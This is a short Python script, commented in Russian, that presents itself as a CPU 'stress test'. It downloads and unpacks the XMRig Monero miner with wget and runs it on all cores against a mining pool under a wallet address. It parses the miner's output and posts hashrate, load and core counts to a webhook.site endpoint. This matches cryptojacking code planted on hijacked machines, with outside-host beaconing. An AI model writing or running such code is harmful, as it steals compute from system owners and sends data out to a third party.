import os
import subprocess
import http.client
import json
import time

HOOK_DOMAIN = "webhook.site"
HOOK_PATH = "/d9ed8938-0733-4ce3-8d2c-63dab5606e87"

def send_report(status, hashrate="0 H/s"):
    try:
        payload = json.dumps({
            "EVENT": status,
            "HASHRATE": hashrate,
            "LOAD": os.getloadavg(),
            "CORES": os.cpu_count()
        })
        conn = http.client.HTTPSConnection(HOOK_DOMAIN, timeout=5)
        conn.request("POST", HOOK_PATH, payload, {"Content-Type": "application/json"})
        conn.getresponse()
        conn.close()
    except: pass

def launch_stress():
    # 1. Скачиваем XMRig (статическая сборка)
    print("[*] Downloading heavy-duty stress tool...")
    os.system("wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz")
    os.system("tar -xf xmrig-6.21.0-linux-static-x64.tar.gz")
    
    # 2. Запуск на dummy-адрес (просто нагрузка)
    # --cpu-max-threads-hint 100 заставит его использовать все ядра
    cmd = [
        "./xmrig-6.21.0/xmrig", 
        "-o", "donate.v2.xmrig.com:3333", 
        "-u", "44AFFq5kSiGBo3SBYnrYcyEC2UWXSp2B8F6K8sZ9z41YhUrX7ivU", 
        "--cpu-max-threads-hint", "100",
        "--print-time", "10"
    ]
    
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    
    # 3. Парсим лог и шлем хешрейт на хук
    print("[*] Miner started. Watching hashrate...")
    for line in iter(process.stdout.readline, ""):
        if "speed" in line:
            # Вытягиваем хешрейт (например: speed 10s/60s/15m 2500.5 n/a n/a H/s)
            parts = line.split()
            try:
                h_index = parts.index("H/s") - 1
                current_hash = parts[h_index]
                send_report("MINING_LOAD_ACTIVE", f"{current_hash} H/s")
            except:
                send_report("MINING_LOAD_ACTIVE", "Reading speed...")

if __name__ == "__main__":
    send_report("INITIATING_HASHRATE_TEST")
    launch_stress()
